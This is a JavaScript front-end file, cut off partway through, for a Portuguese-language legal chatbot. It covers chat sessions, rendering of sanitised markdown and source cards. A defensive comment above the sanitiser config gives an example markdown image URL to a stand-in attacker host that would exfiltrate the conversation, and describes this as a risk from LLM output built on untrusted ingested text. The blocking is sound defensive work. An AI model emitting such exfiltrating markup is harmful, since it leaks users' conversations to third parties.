/**
 * Jurix Chatbot Engine
 * Full-featured Swiss Design Legal Assistant Frontend.
 * Modular, decoupled from Django HTML templates.
 */

(function () {
    'use strict';

    // ===== CONFIGURATION =====
    const config = window.JURIX_CONFIG || {
        chatbotUrl: '/assistente/',
        logoIconUrl: '/static/img/logo-icon.svg',
        userName: 'Admin',
    };

    const chatAPI = window.JurixChatAPI;

    function getSessionSlugFromPath() {
        const pathname = window.location.pathname.replace(/\/+$/, '');
        const configuredBase = String(config.chatbotUrl || '/assistente/').replace(/\/+$/, '');
        if (pathname.startsWith(`${configuredBase}/`)) {
            return pathname.slice(configuredBase.length + 1).split('/')[0] || null;
        }
        const legacyMarker = '/chatbot/';
        const legacyIndex = pathname.indexOf(legacyMarker);
        if (legacyIndex >= 0) {
            return pathname.slice(legacyIndex + legacyMarker.length).split('/')[0] || null;
        }
        return null;
    }

    // ===== MARKED.JS CONFIGURATION =====
    if (typeof marked !== 'undefined') {
        marked.setOptions({
            breaks: true,
            gfm: true,
            headerIds: false,
            mangle: false,
        });
    }

    // ===== APP STATE =====
    const chatState = window.JurixChatState;
    let currentSessionId = null;
    let isStreamingGreeting = false;

    // ===== SUGGESTION QUESTIONS =====
    const SUGGESTION_QUESTIONS = [
        'Como funciona o zoneamento urbano?',
        'Quais as regras para licença de construção?',
        'Explique as normas de uso do solo',
        'Quais são os requisitos para alvará de funcionamento?',
        'Como funciona o cadastramento de imóveis?',
        'Quais as normas sobre reformas e ampliações?',
        'Explique as regras de regularização de construções',
        'Como funciona o licenciamento ambiental?',
        'Quais são as regras de parcelamento do solo?',
        'Explique as normas de ocupação do solo',
    ];

    // ===== UTILITIES =====
    function escapeHtml(text) {
        if (!text) return '';
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }

    // Answers are LLM output built from ingested (untrusted) text, so they are sanitised after
    // markdown rendering. DOMPurify already blocks script execution; the extra rules close a
    // second channel: markup whose only effect is that the BROWSER requests an attacker URL by
    // itself (![](https://evil/?q=<conversation>), CSS url(), <link>, <video poster>...), which
    // exfiltrates the conversation with no script at all. Legal answers need none of these tags;
    // ordinary links (<a href>) are untouched.
    const SANITIZE_CONFIG = {
        FORBID_TAGS: [
            'img', 'picture', 'source', 'video', 'audio', 'track', 'image', 'use', 'svg', 'math',
            'style', 'link', 'form', 'input', 'button', 'textarea', 'select',
        ],
        FORBID_ATTR: ['style', 'srcset', 'poster', 'background', 'ping'],
    };

    function renderMarkdown(text) {
        if (window.JurixMarkdown && typeof window.JurixMarkdown.render === 'function') {
            return window.JurixMarkdown.render(text);
        }
        return DOMPurify.sanitize(marked.parse(text), SANITIZE_CONFIG);
    }

    // Escape for a double-quoted HTML ATTRIBUTE. escapeHtml() is not enough there: it leaves
    // quotes untouched, so a value containing " or ' could close the attribute (or a JS string
    // inside an inline handler) and inject code.
    function escapeAttr(text) {
        return String(text ?? '')
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#39;');
    }

    // Only http(s) URLs may be opened from a source card: javascript:, data:, vbscript: and
    // friends are dropped. The value comes from ingested SAPL data, i.e. it is not trusted.
    function safeHttpUrl(value) {
        if (!value) return null;
        try {
            const url = new URL(String(value), window.location.href);
            return url.protocol === 'http:' || url.protocol === 'https:' ? url.href : null;
        } catch (_) {
            return null;
        }
    }

    // The delete-session button and the suggestion chips carry their argument in a data-*
    // attribute and are wired through this ONE delegated listener, instead of an inline onclick
    // (a CSP without 'unsafe-inline' blocks every inline handler; this is required for that).
    document.addEventListener('click', (event) => {
        const deleteBtn = event.target.closest ? event.target.closest('[data-delete-session-id]') : null;
        if (deleteBtn) {
            event.stopPropagation();
            deleteSession(deleteBtn.dataset.deleteSessionId, event);
            return;
        }
        const chip = event.target.closest ? event.target.closest('.chip[data-question]') : null;
        if (chip) { askQuestion(chip.dataset.question); return; }

        // Suggestion cards and "recent search" rows carry the question in data-question.
        const questionEl = event.target.closest ? event.target.closest('[data-question]') : null;
        if (questionEl) { askQuestion(questionEl.dataset.question); return; }

        // Sidebar/header buttons that open the command palette (data-open-command-palette).
        const paletteTrigger = event.target.closest ? event.target.closest('[data-open-command-palette]') : null;
        if (paletteTrigger) {
            event.preventDefault();
            const input = document.getElementById('command-palette-trigger');
            if (input) input.click();
        }
    });

    // The hero search form used to run its logic in an inline onsubmit (blocked by CSP without
    // 'unsafe-inline'); a real submit listener replaces it, same behaviour.
    const heroSearchForm = document.getElementById('hero-search-form');
    if (heroSearchForm) {
        heroSearchForm.addEventListener('submit', (event) => {
            event.preventDefault();
            const input = document.getElementById('hero-search-input');
            const value = input ? input.value.trim() : '';
            if (value && window.jurixChat && window.jurixChat.askQuestion) {
                window.jurixChat.askQuestion(value);
            }
        });
    }

    // Source cards carry the URL in a data attribute and are opened by ONE delegated listener,
    // instead of an inline onclick that interpolated the URL into JavaScript.
    document.addEventListener('click', (event) => {
        const card = event.target.closest ? event.target.closest('.source-card-clickable[data-url]') : null;
        if (!card) return;
        const url = safeHttpUrl(card.dataset.url);   // re-validated at use time
        if (url) window.open(url, '_blank', 'noopener,noreferrer');
    });

    function getCookie(name) {
        let cookieValue = null;
        if (document.cookie && document.cookie !== '') {
            const cookies = document.cookie.split(';');
            for (let i = 0; i < cookies.length; i++) {
                const cookie = cookies[i].trim();
                if (cookie.substring(0, name.length + 1) === name + '=') {
                    cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
                    break;
                }
            }
        }
        return cookieValue;
    }

    function scrollToBottom() {
        const container = document.getElementById('messages-container');
        if (container) {
            container.scrollTop = container.scrollHeight;
        }
    }

    function scrollToBottomIfAtBottom() {
        const container = document.getElementById('messages-container');
        if (!container) return;
        const threshold = 100;
        const isAtBottom = container.scrollHeight - container.scrollTop - container.clientHeight < threshold;
        if (isAtBottom) {
            container.scrollTop = container.scrollHeight;
        }
    }

    function shuffleArray(array) {
        const shuffled = [...array];
        for (let i = shuffled.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
        }
        return shuffled;
    }

    // ===== CHAT SESSIONS MANAGEMENT =====
    async function loadChatSessions() {
        try {
            const data = await chatAPI.listSessions();
            if (!data.success || !data.sessions) return;

            const sessionsList = document.getElementById('chat-sessions-list');
            if (!sessionsList) return;

            if (data.sessions.length === 0) {
                sessionsList.innerHTML =
                    '<div style="padding: var(--space-2); color: var(--color-text-secondary); font-size: var(--font-size-xs); text-align: center;">Nenhuma conversa ainda</div>';
                return;
            }

            const tempCards = Array.from(
                sessionsList.querySelectorAll('.chat-session-item[data-session-id^="temp-"]')
            );

            const existingItems = sessionsList.querySelectorAll(
                '.chat-session-item:not([data-session-id^="temp-"])'
            );
            existingItems.forEach((item) => item.remove());

            const emptyState = sessionsList.querySelector('div:not(.chat-session-item)');
            if (emptyState && !emptyState.classList.contains('chat-session-item')) {
                emptyState.remove();
            }

            const sessionSlug = getSessionSlugFromPath();
            const isInNewConversation = !sessionSlug && !currentSessionId;

            data.sessions.forEach((session, index) => {
                const existing = sessionsList.querySelector(`[data-session-id="${session.id}"]`);
                if (existing) {
                    const shouldBeActive =
                        !isInNewConversation &&
                        ((sessionSlug && session.slug === sessionSlug) ||
                            (!sessionSlug && currentSessionId && parseInt(session.id) === currentSessionId));
                    existing.className = `chat-session-item ${shouldBeActive ? 'active' : ''}`;
                    const titleEl = existing.querySelector('.chat-session-title');
                    if (titleEl) {
                        titleEl.textContent = session.latest_message_preview || session.title;
                    }
                    return;
                }

                const shouldBeActive =
                    !isInNewConversation &&
                    ((sessionSlug && session.slug === sessionSlug) ||
                        (!sessionSlug && currentSessionId && parseInt(session.id) === currentSessionId));

                const sessionItem = document.createElement('div');
                sessionItem.className = `chat-session-item ${shouldBeActive ? 'active' : ''}`;
                sessionItem.dataset.sessionId = session.id;
                sessionItem.setAttribute('role', 'button');
                sessionItem.setAttribute('tabindex', '0');
                sessionItem.onclick = () => loadSession(session.id);
                sessionItem.onkeydown = (e) => {
                    if (e.key === 'Enter') loadSession(session.id);
                };

                sessionItem.innerHTML = `
                    <div style="flex: 1; min-width: 0;">
                        <div class="chat-session-title">${escapeHtml(session.latest_message_preview || session.title)}</div>
                    </div>
                    <button 
                        class="delete-session-button" 
                        data-delete-session-id="${session.id}"
                        aria-label="Deletar conversa"
                        title="Deletar conversa">
                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="delete-icon">
                            <path d="M3 6h18M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                        </svg>
                    </button>
                `;

                if (tempCards.length > 0 && tempCards[0].parentNode === sessionsList) {
                    sessionsList.insertBefore(sessionItem, tempCards[0]);
                } else if (
                    sessionsList.firstChild &&
                    sessionsList.firstChild.classList &&
                    sessionsList.firstChild.classList.contains('chat-session-item')
                ) {
                    sessionsList.insertBefore(sessionItem, sessionsList.firstChild);
                } else {
                    sessionsList.appendChild(sessionItem);
                }

                sessionItem.style.opacity = '0';
                sessionItem.style.transform = 'translateY(-5px)';
                setTimeout(() => {
                    sessionItem.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
                    sessionItem.style.opacity = '1';
                    sessionItem.style.transform = 'translateY(0)';
                }, index * 30);
            });
        } catch (error) {
            console.error('Error loading chat sessions:', error);
        }
    }

    function updateNewChatButtonState() {
        const newChatBtn = document.getElementById('new-chat-button');
        if (!newChatBtn) return;

        const sessionSlug = getSessionSlugFromPath();

        if (!sessionSlug && !currentSessionId) {
            newChatBtn.disabled = true;
            newChatBtn.classList.add('disabled');
            newChatBtn.style.opacity = '0.5';
            newChatBtn.style.cursor = 'not-allowed';
        } else {
            newChatBtn.disabled = false;
            newChatBtn.classList.remove('disabled');
            newChatBtn.style.opacity = '1';
            newChatBtn.style.cursor = 'pointer';
        }
    }

    async function createNewSession() {
        try {
            window.history.pushState({}, '', config.chatbotUrl);
            currentSessionId = null;
            chatState.setSessionId(null);

            const messagesWrapper = document.getElementById('messages-wrapper');
            if (messagesWrapper) {
                const welcomeState = document.getElementById('welcome-state');
                const messages = messagesWrapper.querySelectorAll('.message');
                messages.forEach((msg) => msg.remove());

                if (welcomeState) {
                    welcomeState.style.display = 'flex';
                    if (welcomeState.parentNode !== messagesWrapper) {
                        messagesWrapper.insertBefore(welcomeState, messagesWrapper.firstChild);
                    }
                } else {
                    const newWelcomeState = document.createElement('div');
                    newWelcomeState.id = 'welcome-state';
                    newWelcomeState.className = 'welcome-state';
                    newWelcomeState.style.display = 'flex';
                    newWelcomeState.innerHTML = `
                        <h1 class="welcome-greeting">
                            <span class="greeting-text">Olá, </span>
                            <span class="greeting-name" data-user-name="${escapeHtml(config.userName)}">${escapeHtml(config.userName)}</span>
                        </h1>
                        <div class="suggestion-chips" id="suggestion-chips" role="list" aria-label="Sugestões de perguntas"></div>
                    `;
                    messagesWrapper.insertBefore(newWelcomeState, messagesWrapper.firstChild);
                }
            }

            showWelcomeStateWithStreaming();

            const textarea = document.getElementById('question-textarea');
            if (textarea) {
                textarea.value = '';
                textarea.style.height = 'auto';
                Object.keys(localStorage).forEach((key) => {
                    if (key.startsWith('chat-input-')) {
                        localStorage.removeItem(key);
                    }
                });
            }

            await loadChatSessions();
            updateNewChatButtonState();
        } catch (error) {
            console.error('Error creating new session:', error);
        }
    }

    async function loadSession(sessionId) {
        if (!sessionId) return;

        try {
            const sessionData = await chatAPI.getSession(sessionId);
            if (!sessionData.success || !sessionData.session) return;

            const sessionSlug = sessionData.session.slug || sessionData.session.id;
            const sessionUrl = `${config.chatbotUrl}${sessionSlug}/`;
            window.history.pushState({}, '', sessionUrl);

            currentSessionId = sessionId;
            if (chatState && typeof chatState.setSessionId === 'function') {
                chatState.setSessionId(sessionId);
            }

            const messagesWrapper = document.getElementById('messages-wrapper');
            if (messagesWrapper) {
                const welcomeState = document.getElementById('welcome-state');
                const messages = messagesWrapper.querySelectorAll('.message');
                messages.forEach((msg) => msg.remove());

                const existingIndicator = messagesWrapper.querySelector('.messages-load-more-indicator');
                if (existingIndicator) existingIndicator.remove();

                if (welcomeState) {
                    welcomeState.style.display =
                        sessionData.messages && sessionData.messages.length > 0 ? 'none' : 'flex';
                }
            }

            document.querySelectorAll('.chat-session-item').forEach((item) => {
                item.classList.remove('active');
                if (parseInt(item.dataset.sessionId) === sessionId) {
                    item.classList.add('active');
                }
            });

            if (sessionData.messages && sessionData.messages.length > 0) {
                const assistantMessages = sessionData.messages.filter((m) => m.role === 'assistant');
                let messageIndex = 0;

                for (let i = 0; i < sessionData.messages.length; i++) {
                    const msg = sessionData.messages[i];
                    if (msg.role === 'user') {
                        addUserMessage(msg.content);
                    } else if (msg.role === 'assistant') {
                        messageIndex++;
                        const isLastAssistant = messageIndex === assistantMessages.length;
                        addAssistantMessage(
                            msg.content,
                            msg.sources || [],
                            isLastAssistant && currentSessionId ? true : false,
                            true
                        );
                    }
                }
            }

            scrollToBottom();
            loadSavedText(sessionId);
            updateNewChatButtonState();
        } catch (error) {
            console.error('Error loading session:', error);
            window.location.href = config.chatbotUrl;
        }
    }

    function loadSavedText(sessionId) {
        const textarea = document.getElementById('question-textarea');
        if (!textarea || !sessionId) return;
        const savedText = localStorage.getItem(`chat-input-${sessionId}`);
        if (savedText !== null) {
            textarea.value = savedText;
            textarea.style.height = 'auto';
            textarea.style.height = Math.min(textarea.scrollHeight, 200) + 'px';
        }
    }

    async function createSessionCardImmediately(question) {
        const sessionsList = document.getElementById('chat-sessions-list');
        if (!sessionsList) return;

        const tempSessionId = 'temp-' + Date.now();
        const sessionTitle = question.length > 50 ? question.substring(0, 50) + '...' : question;

        const sessionCard = document.createElement('div');
        sessionCard.className = 'chat-session-item active session-card-new';
        sessionCard.dataset.sessionId = tempSessionId;
        sessionCard.setAttribute('role', 'button');
        sessionCard.setAttribute('tabindex', '0');
        sessionCard.innerHTML = `
            <div style="flex: 1; min-width: 0;">
                <div class="chat-session-title">${escapeHtml(sessionTitle)}</div>
            </div>
            <button 
                class="delete-session-button" 
                data-delete-session-id="${tempSessionId}"
                aria-label="Deletar conversa"
                title="Deletar conversa">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="delete-icon">
                    <path d="M3 6h18M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                </svg>
            </button>
        `;

        if (
            sessionsList.firstChild &&
            sessionsList.firstChild.classList &&
            sessionsList.firstChild.classList.contains('chat-session-item')
        ) {
            sessionsList.insertBefore(sessionCard, sessionsList.firstChild);
        } else {
            const emptyState = sessionsList.querySelector('div:not(.chat-session-item)');
            if (emptyState) emptyState.remove();
            sessionsList.insertBefore(sessionCard, sessionsList.firstChild);
        }

        window.tempSessionCard = sessionCard;
    }

    function animateSessionCreated() {
        const toast = document.createElement('div');
        toast.className = 'session-created-toast';
        toast.innerHTML = `
            <div class="session-created-content">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M20 6L9 17l-5-5" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                </svg>
                <span>Conversa registrada no histórico</span>
            </div>
        `;
        document.body.appendChild(toast);

        requestAnimationFrame(() => {
            toast.classList.add('show');
        });

        setTimeout(() => {
            toast.classList.remove('show');
            setTimeout(() => toast.remove(), 300);
        }, 2500);
    }

    function deleteSession(sessionId, event) {
        if (!sessionId) return;
        showDeleteModal(sessionId);
    }

    function showDeleteModal(sessionId) {
        let modalOverlay = document.getElementById('delete-session-modal');
        if (!modalOverlay) {
            modalOverlay = document.createElement('div');
            modalOverlay.id = 'delete-session-modal';
            modalOverlay.className = 'delete-modal-overlay';
            modalOverlay.innerHTML = `
                <div class="delete-modal">
                    <div class="delete-modal-header">
                        <h3>Deletar Conversa</h3>
                    </div>
                    <div class="delete-modal-body">
                        <p>Tem certeza que deseja deletar esta conversa? Esta ação não pode ser desfeita.</p>
                    </div>
                    <div class="delete-modal-footer">
                        <button class="delete-modal-cancel" id="delete-modal-cancel">Cancelar</button>
                        <button class="delete-modal-confirm" id="delete-modal-confirm">Deletar</button>
                    </div>
                </div>
            `;
            document.body.appendChild(modalOverlay);

            document.getElementById('delete-modal-cancel').addEventListener('click', () => {
                modalOverlay.classList.remove('active');
            });

            modalOverlay.addEventListener('click', (e) => {
                if (e.target === modalOverlay) modalOverlay.classList.remove('active');
            });
        }

        const confirmBtn = document.getElementById('delete-modal-confirm');
        confirmBtn.onclick = async () => {
            modalOverlay.classList.remove('active');
            await performDeleteSession(sessionId);
        };

        modalOverlay.style.display = 'flex';
        requestAnimationFrame(() => {
            modalOverlay.classList.add('active');
        });
    }

    async function performDeleteSession(sessionId) {
        try {
            await chatAPI.deleteSession(sessionId);

            if (currentSessionId === sessionId) {
                currentSessionId = null;
                if (chatState && typeof chatState.setSessionId === 'function') {
                    chatState.setSessionId(null);
                }
                const messagesWrapper = document.getElementById('messages-wrapper');
                if (messagesWrapper) {
                    messagesWrapper.querySelectorAll('.message').forEach((m) => m.remove());
                }
                const welcomeState = document.getElementById('welcome-state');
                if (welcomeState) welcomeState.style.display = 'flex';
                renderRandomSuggestions();
            }

            await loadChatSessions();
        } catch (error) {
            console.error('Error deleting session:', error);
            showNotification('Erro ao deletar conversa. Tente novamente.', 'error');
        }
    }

    function showNotification(message, type = 'error') {
        let toast = document.getElementById('chat-toast-notification');
        if (!toast) {
            toast = document.createElement('div');
            toast.id = 'chat-toast-notification';
            toast.style.cssText = 'position: fixed; bottom: 24px; right: 24px; padding: 12px 18px; border-radius: 8px; font-size: 13px; font-weight: 500; z-index: 9999; transition: opacity 0.3s ease, transform 0.3s ease; box-shadow: 0 4px 12px rgba(0,0,0,0.15);';
            document.body.appendChild(toast);
        }
        toast.style.background = type === 'error' ? '#ef4444' : '#10b981';
        toast.style.color = '#ffffff';
        toast.textContent = message;
        toast.style.opacity = '1';
        toast.style.transform = 'translateY(0)';
        setTimeout(() => {
            toast.style.opacity = '0';
            toast.style.transform = 'translateY(8px)';
        }, 3500);
    }

    // ===== MESSAGE RENDERING =====
    function addUserMessage(text) {
        if (!window.JurixChatRenderer) return;
        window.JurixChatRenderer.addUserMessage(text, { scrollToBottom, renderMarkdown, escapeHtml });
    }

    function addLoadingMessage() {
        if (!window.JurixChatRenderer) return null;
        return window.JurixChatRenderer.addLoadingMessage({ config, scrollToBottom, esc: escapeHtml });
    }

    function removeLoadingMessage(loadingId) {
        const loadingMsg = document.getElementById(loadingId);
        if (loadingMsg) loadingMsg.remove();
    }

    function addAssistantMessage(answer, sources, showRegenerate = false, skipStreaming = false) {
        const messagesWrapper = document.getElementById('messages-wrapper');
        if (!messagesWrapper) return;

        const timestamp = new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
        const messageId = 'msg-' + Date.now();
        const sourcesId = 'sources-' + Date.now();
        const copyButtonId = 'copy-btn-' + Date.now();

        const messageDiv = document.createElement('div');
        messageDiv.className = 'message message-assistant';
        messageDiv.innerHTML = `
            <div class="message-avatar">
                <img src="${escapeHtml(config.logoIconUrl)}" alt="Jurix">
            </div>
            <div class="message-content">
                <div class="message-header">
                    <span class="message-role">Jurix</span>
                    <span class="message-time">${timestamp}</span>
                </div>
                <div class="message-body jurix-legal-answer" id="${messageId}"></div>
                <div class="message-actions">
                    <button class="regenerate-button" id="regenerate-${Date.now()}" aria-label="Tentar novamente" title="Tentar novamente" style="display: none;">
                        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path d="M3 12a9 9 0 0 1 9-9 9.75 9.75 0 0 1 6.74 2.74L21 8" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                            <path d="M21 3v5h-5" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                            <path d="M21 12a9 9 0 0 1-9 9 9.75 9.75 0 0 1-6.74-2.74L3 16" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                            <path d="M3 21v-5h5" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                        </svg>
                    </button>
                    <button class="copy-response-button" id="${copyButtonId}" aria-label="Copiar resposta em Markdown" title="Copiar resposta">
                        <svg class="copy-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" stroke-width="2"/>
                            <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" stroke="currentColor" stroke-width="2"/>
                        </svg>
                        <svg class="check-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="display: none;">
                            <path d="M20 6L9 17l-5-5" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                        </svg>
                    </button>
                </div>
                <div id="${sourcesId}"></div>
            </div>
        `;

        messagesWrapper.appendChild(messageDiv);
        scrollToBottom();

        const sourcesContainer = document.getElementById(sourcesId);
        const copyButton = document.getElementById(copyButtonId);
        const messageBody = document.getElementById(messageId);

        copyButton.setAttribute('data-markdown', answer);
        copyButton.addEventListener('click', () => {
            copyResponseToClipboard(copyButton.getAttribute('data-markdown') || answer, copyButton);
        });

        const regenerateBtn = messageDiv.querySelector('.regenerate-button');

        if (skipStreaming) {
            if (messageBody && typeof marked !== 'undefined' && typeof DOMPurify !== 'undefined') {
                messageBody.innerHTML = renderMarkdown(answer);
            } else {
                messageBody.textContent = answer;
            }
            copyButton.classList.add('show');

            if (regenerateBtn && currentSessionId && showRegenerate) {
                regenerateBtn.style.display = 'inline-flex';
                regenerateBtn.classList.add('show');
                regenerateBtn.addEventListener('click', async () => {
                    await regenerateLastResponse(currentSessionId, messageDiv, sourcesContainer);
                });
            }

            if (sources && sources.length > 0) {
                showSourcesGradually(sourcesContainer, sources);
            }
        } else {
            typewriterEffect(messageId, answer, () => {
                copyButton.classList.add('show');

                if (regenerateBtn && currentSessionId && showRegenerate) {
                    regenerateBtn.style.display = 'inline-flex';
                    regenerateBtn.classList.add('show');
                    regenerateBtn.addEventListener('click', async () => {
                        await regenerateLastResponse(currentSessionId, messageDiv, sourcesContainer);
                    });
                }

                if (sources && sources.length > 0) {
                    showSourcesGradually(sourcesContainer, sources);
                }
            });
        }
    }

    async function regenerateLastResponse(sessionId, messageDiv, sourcesContainer) {
        if (!sessionId || (chatState && typeof chatState.isBusy === 'function' && chatState.isBusy())) return;

        try {
            if (chatState && typeof chatState.transition === 'function') {
                chatState.transition('regenerating', { sessionId });
            }
            const regenerateBtn = messageDiv.querySelector('.regenerate-button');
            const copyButton = messageDiv.querySelector('.copy-response-button');

            if (regenerateBtn) {
                regenerateBtn.disabled = true;
                regenerateBtn.style.opacity = '0.5';
            }

            const messageBody = messageDiv.querySelector('.message-body');
            if (messageBody) {
                messageBody.innerHTML =
                    '<div class="loading-message"><div class="loading-dots"><div class="loading-dot"></div><div class="loading-dot"></div><div class="loading-dot"></div></div><span>Regenerando resposta...</span></div>';
            }

            if (sourcesContainer) sourcesContainer.innerHTML = '';
            if (copyButton) copyButton.style.display = 'none';
            if (regenerateBtn) regenerateBtn.style.display = 'none';

            const data = await chatAPI.regenerateSession(sessionId);
            if (data.success && messageBody) {
                messageBody.innerHTML = '';
                if (copyButton) copyButton.setAttribute('data-markdown', data.answer);

                typewriterEffect(messageBody.id, data.answer, () => {
                    if (copyButton) {
                        copyButton.style.display = 'inline-flex';
                        copyButton.classList.add('show');
                    }
                    if (regenerateBtn) {
                        regenerateBtn.style.display = 'inline-flex';
                        regenerateBtn.classList.add('show');
                        regenerateBtn.disabled = false;
                        regenerateBtn.style.opacity = '1';
                    }
                    if (data.sources && data.sources.length > 0) {
                        showSourcesGradually(sourcesContainer, data.sources);
                    }
                });
            }
        } catch (error) {
            console.error('Error regenerating response:', error);
            const messageBody = messageDiv.querySelector('.message-body');
            if (messageBody) {
                messageBody.innerHTML =
                    '<p style="color: var(--color-error);">Erro ao regenerar resposta. Tente novamente.</p>';
            }
        } finally {
            chatState.transition('idle');
        }
    }

    function copyResponseToClipboard(markdownText, button) {
        if (!markdownText) return;
        navigator.clipboard
            .writeText(markdownText)
            .then(() => {
                const copyIcon = button.querySelector('.copy-icon');
                const checkIcon = button.querySelector('.check-icon');
                if (copyIcon && checkIcon) {
                    copyIcon.style.display = 'none';
                    checkIcon.style.display = 'block';
                    button.classList.add('copied');
                    setTimeout(() => {
                        copyIcon.style.display = 'block';
                        checkIcon.style.display = 'none';
                        button.classList.remove('copied');
                    }, 2000);
                }
            })
            .catch((err) => console.error('Failed to copy:', err));
    }

    // ===== SOURCES RENDERING =====
    function showSourcesGradually(container, sources) {
        if (!sources || sources.length === 0 || !container) return;

        const sortedSources = [...sources].sort((a, b) => {
            const scoreA = parseFloat(a.similarity_score || 0);
            const scoreB = parseFloat(b.similarity_score || 0);
            return scoreB - scoreA;
        });

        const headerHtml = `
            <div class="sources-section">
                <div class="sources-header">
                    <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M8 2V14M2 8H14" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
                    </svg>
                    <span>${sortedSources.length} ${sortedSources.length === 1 ? 'Fonte' : 'Fontes'}</span>
                </div>
                <div class="jurix-rag-evidence-caption">Evidências recuperadas para esta resposta</div>
                <div class="sources-grid"></div>
            </div>
        `;

        container.innerHTML = headerHtml;
        const gridContainer = container.querySelector('.sources-grid');

        sortedSources.forEach((source, index) => {
            setTimeout(() => {
                const cardHtml = createSourceCard(source, index);
                gridContainer.insertAdjacentHTML('beforeend', cardHtml);

                const cardElement = gridContainer.lastElementChild;
                if (cardElement) {
                    cardElement.style.opacity = '0';
                    cardElement.style.transform = 'translateY(10px)';
                    requestAnimationFrame(() => {
                        cardElement.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
                        cardElement.style.opacity = '1';
                        cardElement.style.transform = 'translateY(0)';
                    });
                }
                scrollToBottom();
            }, index * 100);
        });
    }

    function createSourceCard(source, index) {
        if (window.JurixRagUI && typeof window.JurixRagUI.renderEvidenceCard === 'function') {
            return window.JurixRagUI.renderEvidenceCard(source, index);
        }
        let rawScore = source.similarity_score;
        if (rawScore === undefined || rawScore === null) {
            rawScore = Math.max(0, 1 - parseFloat(source.distance || 1.0));
        }

        let normalizedScore = Math.max(0, Math.min(1, parseFloat(rawScore) || 0));
        let scorePercent = Math.round(normalizedScore * 100);
        scorePercent = Math.max(1, Math.min(100, scorePercent));

        const scoreClass =
            scorePercent >= 80
                ? 'score-fill-high'
                : scorePercent >= 60
                ? 'score-fill-medium'
                : 'score-fill-low';

        const normaRef = source.norma || source.norma_ref || 'Norma';
        const dispositivoRef = source.dispositivo_ref || '';
        const snippet = source.text || source.full_text || '';
        const linkUrl = safeHttpUrl(source.pdf_url) || safeHttpUrl(source.sapl_url);

        const cardClasses = linkUrl ? 'source-card source-card-clickable jurix-rag-source' : 'source-card jurix-rag-source';
        const dataUrlAttr = linkUrl ? `data-url="${escapeAttr(linkUrl)}"` : '';

        return `
            <div class="${cardClasses}" ${dataUrlAttr} title="${linkUrl ? 'Clique para abrir no SAPL/PDF' : ''}">
                <div class="source-card-header">
                    <div class="source-title">${escapeHtml(normaRef)}</div>
                    <div class="source-score">
                        <div class="score-bar">
                            <div class="score-fill ${scoreClass}" data-score="${scorePercent}"></div>
                        </div>
                        <span>${scorePercent}%</span>
                    </div>
                </div>
                ${dispositivoRef ? `<div class="source-meta">${escapeHtml(dispositivoRef)}</div>` : ''}
                <div class="source-snippet">${escapeHtml(snippet.substring(0, 120))}${snippet.length > 120 ? '...' : ''}</div>
            </div>
        `;
    }

    function addErrorMessage(errorText) {
        const messagesWrapper = document.getElementById('messages-wrapper');
        if (!messagesWrapper) return;
        const timestamp = new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });

        const errorHtml = `
            <div class="message message-assistant">
                <div class="message-avatar">
                    <img src="${escapeHtml(config.logoIconUrl)}" alt="Jurix">
                </div>
                <div class="message-content">
                    <div class="message-header">
                        <span class="message-role">Jurix</span>
                        <span class="message-time">${timestamp}</span>
                    </div>
                    <div class="message-body" style="border-color: var(--color-error); background: #fef2f2;">
                        <span class="error-icon" aria-hidden="true">!</span> ${escapeHtml(errorText)}
                    </div>
                </div>
            </div>
        `;

        messagesWrapper.insertAdjacentHTML('beforeend', errorHtml);
        scrollToBottom();
    }

    // ===== TYPEWRITER & MARKDOWN =====
    function fixMarkdownFormatting(text) {
        return text
            .replace(/([•\-])\s+([^•\n]+?);\s+([•\-])/g, '$1 $2\n$3')
            .replace(/([•\-])\s+([^•\n]+?)\s+([•\-])\s+/g, '$1 $2\n$3 ')
            .replace(/;\s+([•\-])/g, '\n$1')
            .replace(/([^\n])([•\-])\s+/g, '$1\n$2 ')
            .replace(/\n{3,}/g, '\n\n');
    }

    function typewriterEffect(elementId, text, onComplete) {
        const element = document.getElementById(elementId);
        if (!element) return;

        text = fixMarkdownFormatting(text);
        const words = text.split(/(\s+)/);
        let wordIndex = 0;
        const speed = 15;
        const fullHtml = renderMarkdown(text);

        function type() {
            if (wordIndex < words.length) {
